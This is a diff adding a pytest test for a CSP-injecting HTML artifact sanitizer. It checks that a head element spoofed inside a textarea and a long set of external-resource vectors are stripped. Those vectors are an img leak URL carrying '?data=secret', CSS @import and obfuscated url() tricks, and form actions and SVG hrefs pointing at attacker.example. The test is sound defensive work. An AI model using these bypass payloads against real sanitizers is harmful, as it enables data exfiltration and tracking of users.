@@ -4369,6 +4369,61 @@ class TestAdminChatArtifactEndpoints:
         assert 'src="data:image/png;base64,iVBORw0KGgo="' in body
         assert 'href="https://jenkins.example.com/job/42"' in body
 
+    def test_save_artifact_resists_rcdata_head_spoof_and_strips_external_resources(
+        self, test_client
+    ):
+        """<head> inside <textarea> cannot hijack CSP injection; external assets are stripped (#606)."""
+        expected_meta = (
+            '<meta http-equiv="Content-Security-Policy" '
+            "content=\"default-src 'none'; style-src 'unsafe-inline'; "
+            'img-src data:; font-src data:;">'
+        )
+        spoofed_html = (
+            "<textarea><!DOCTYPE html><head></textarea>"
+            '<img src="https://attacker.example/leak?data=secret" '
+            'srcset="https://attacker.example/2x.png 2x">'
+            '<svg><use href="https://attacker.example/sprite.svg#a" />'
+            '<use href="#local-icon" />'
+            '<image xlink:href="https://attacker.example/img.png" /></svg>'
+            '<form action="https://attacker.example/collect">'
+            '<button formaction="https://attacker.example/btn">Go</button></form>'
+            "<style>@import url('https://attacker.example/a.css');"
+            "@/*c*/import 'https://attacker.example/b.css';"
+            "body { background: url(https://attacker.example/bg.png); "
+            "background-image: u\\72 l(https://attacker.example/esc.png); "
+            "list-style-image: url/*c*/(https://attacker.example/cmt.png); "
+            'cursor: image-set("https://attacker.example/is.png" 1x); '
+            "color: #111; }</style>"
+            '<div style="background-image: url(https://attacker.example/div.png); color: red">Hi</div>'
+        )
+        save_resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={"html_content": spoofed_html, "filename": "spoofed.html"},
+        )
+        assert save_resp.status_code == 200
+        body = test_client.get(save_resp.json()["download_url"]).text
+
+        # CSP meta tag MUST appear before <textarea>, not trapped inside it
+        assert body.startswith(f"{expected_meta}<textarea>")
+        assert "attacker.example" not in body
+        assert "@import" not in body.lower()
+        # Safe in-document SVG fragment and safe inline CSS survive
+        assert '<use href="#local-icon" />' in body
+        assert "color: #111;" in body
+        assert "color: red" in body
+
+        # Self-closing <style/> cannot open an unsanitized CSS block in HTML5 browsers
+        se_resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={
+                "html_content": "<style/>body{background:url(https://attacker.example/se.png)}</style>",
+                "filename": "self-closing-style.html",
+            },
+        )
+        assert se_resp.status_code == 200
+        se_body = test_client.get(se_resp.json()["download_url"]).text
+        assert "<style" not in se_body.lower()
+
 
 @pytest.mark.asyncio
 class TestCiBuildDataForwarding:
